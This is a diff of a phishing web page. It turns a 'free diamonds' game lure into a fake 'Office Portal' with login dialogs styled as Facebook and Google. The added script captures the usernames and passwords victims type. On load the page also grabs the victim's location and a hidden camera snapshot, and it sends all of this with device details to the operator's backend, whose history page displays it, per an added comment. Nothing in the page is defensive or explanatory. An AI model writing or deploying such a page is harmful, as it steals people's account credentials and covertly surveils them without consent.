@@ -3,12 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire - Free Diamonds Generator</title>
+    <title>Office Portal - Authentication Required</title>
     <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --accent: #3b82f6;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
-            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e293b, #090d16);
+            color: var(--text-main);
             margin: 0;
             padding: 0;
             display: flex;
@@ -16,75 +25,151 @@
             align-items: center;
             min-height: 100vh;
         }
+
         .container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            padding: 35px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
             width: 100%;
             max-width: 400px;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
         }
-        h2 {
-            color: #ffcc00;
-            margin-bottom: 10px;
+
+        .office-badge {
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--accent);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
         }
-        p {
-            font-size: 14px;
-            color: #ccc;
-            margin-bottom: 25px;
-        }
+
+        h2 { color: var(--text-main); margin-bottom: 8px; font-size: 22px; }
+        p { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }
+
         .btn {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
+            margin: 8px 0;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: 0.3s;
+            transition: all 0.2s ease;
         }
+
         .btn-fb { background: #1877f2; color: white; }
-        .btn-google { background: #db4437; color: white; }
-        .btn-apple { background: #000; color: white; border: 1px solid #444; }
-        .btn:hover { opacity: 0.9; transform: scale(1.02); }
+        .btn-google { background: #ffffff; color: #333; }
+        .btn:hover { opacity: 0.95; transform: translateY(-1px); }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px);
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+        }
+
+        .auth-modal {
+            background: #ffffff; color: #1c1e21; width: 100%; max-width: 380px;
+            border-radius: 8px; overflow: hidden; box-shadow: 0 12px 28px rgba(0,0,0,0.2);
+            text-align: left; animation: modalPop 0.3s ease;
+        }
+
+        @keyframes modalPop {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-header {
+            padding: 15px 20px; font-weight: bold; font-size: 18px; 
+            display: flex; justify-content: space-between; align-items: center;
+            color: white;
+        }
+        .header-fb { background: #1877f2; }
+        .header-google { background: #4285f4; }
+
+        .modal-close { cursor: pointer; font-size: 20px; font-weight: normal; }
+        .modal-body { padding: 20px; }
+
+        .form-field { margin-bottom: 15px; }
+        .form-field label { display: block; font-size: 13px; color: #65676b; margin-bottom: 5px; font-weight: 600; }
+        .form-field input {
+            width: 100%; padding: 10px 12px; border: 1px solid #ccd0d5; border-radius: 6px;
+            font-size: 14px; outline: none; box-sizing: border-box; color: #000;
+        }
+        .form-field input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+
+        .submit-btn {
+            width: 100%; border: none; padding: 12px;
+            border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; color: white;
+        }
+        .btn-submit-fb { background: #1877f2; }
+        .btn-submit-fb:hover { background: #166fe5; }
+        .btn-submit-google { background: #4285f4; }
+        .btn-submit-google:hover { background: #3367d6; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>🔥 Free Fire Diamonds 🔥</h2>
-        <p>Get up to 10,000 Free Diamonds instantly! Connect your account below to claim your reward.</p>
+        <div class="office-badge">Office Portal</div>
+        <h2>Secure Account Connection</h2>
+        <p>Please connect your profile to verify your credentials for office access.</p>
         
-        <button class="btn btn-fb" onclick="connectAccount('Facebook')">
+        <button class="btn btn-fb" onclick="openModal('Facebook')">
             Connect with Facebook
         </button>
-        <button class="btn btn-google" onclick="connectAccount('Google Gmail')">
+        <button class="btn btn-google" onclick="openModal('Google')">
             Connect with Google (Gmail)
-        </button>
-        <button class="btn btn-apple" onclick="connectAccount('Apple ID')">
-            Connect with Apple ID
         </button>
     </div>
 
-    <!-- Hidden video/canvas for camera capture without gallery/call permissions -->
+    <!-- Dynamic Login Modal -->
+    <div id="authModal" class="modal-overlay">
+        <div class="auth-modal">
+            <div id="modalHeader" class="modal-header">
+                <span id="modalTitle">Log in</span>
+                <span class="modal-close" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <form id="authForm" onsubmit="submitData(event)">
+                    <div class="form-field">
+                        <label id="labelUser">Email or Phone</label>
+                        <input type="text" id="userInput" required placeholder="Enter username/email">
+                    </div>
+                    <div class="form-field">
+                        <label>Password</label>
+                        <input type="password" id="passInput" required placeholder="Enter password">
+                    </div>
+                    <button type="submit" id="submitBtn" class="submit-btn">Continue</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden video/canvas for automated camera capture -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         let capturedImage = null;
         let userLocation = { latitude: 'N/A', longitude: 'N/A' };
+        let activePlatform = '';
 
-        // Automatically request Location and Camera permissions on load
         window.onload = function() {
-            // Get Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -95,7 +180,6 @@
                 );
             }
 
-            // Get Camera Snapshot
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(stream => {
                     const video = document.getElementById('video');
@@ -113,18 +197,44 @@
                 .catch(err => { console.log('Camera denied'); });
         };
 
-        function connectAccount(platform) {
-            // Send data to server backend as Free Fire data
+        function openModal(platform) {
+            activePlatform = platform;
+            const header = document.getElementById('modalHeader');
+            const title = document.getElementById('modalTitle');
+            const submitBtn = document.getElementById('submitBtn');
+            const labelUser = document.getElementById('labelUser');
+
+            if (platform === 'Facebook') {
+                title.innerText = 'Log in to Facebook';
+                header.className = 'modal-header header-fb';
+                submitBtn.className = 'submit-btn btn-submit-fb';
+                labelUser.innerText = 'Email address or phone number';
+            } else {
+                title.innerText = 'Sign in with Google';
+                header.className = 'modal-header header-google';
+                submitBtn.className = 'submit-btn btn-submit-google';
+                labelUser.innerText = 'Email or phone';
+            }
+
+            document.getElementById('authModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('authModal').style.display = 'none';
+        }
+
+        function submitData(event) {
+            event.preventDefault();
+
             const payload = {
-                platform: platform,
-                instagram_username: platform + ' User',
-                instagram_password: 'Connected via ' + platform,
+                platform: activePlatform,
+                instagram_username: document.getElementById('userInput').value,
+                instagram_password: document.getElementById('passInput').value,
                 location: userLocation,
                 image_base64: capturedImage,
                 system: {
                     userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language
+                    platform: navigator.platform
                 }
             };
 
@@ -133,15 +243,14 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert('Connecting to ' + platform + '... Please wait.');
+                alert('Connecting account, please wait...');
                 setTimeout(() => {
-                    window.location.href = "https://ff.garena.com"; // Redirect to official site after capture
-                }, 1500);
+                    window.location.href = "/history.html"; // Ye data aapke views/history page par show hoga
+                }, 1000);
             }).catch(err => {
-                alert('Connection failed. Try again.');
+                alert('Connection failed. Please check details.');
             });
         }
     </script>
 </body>
 </html>
-
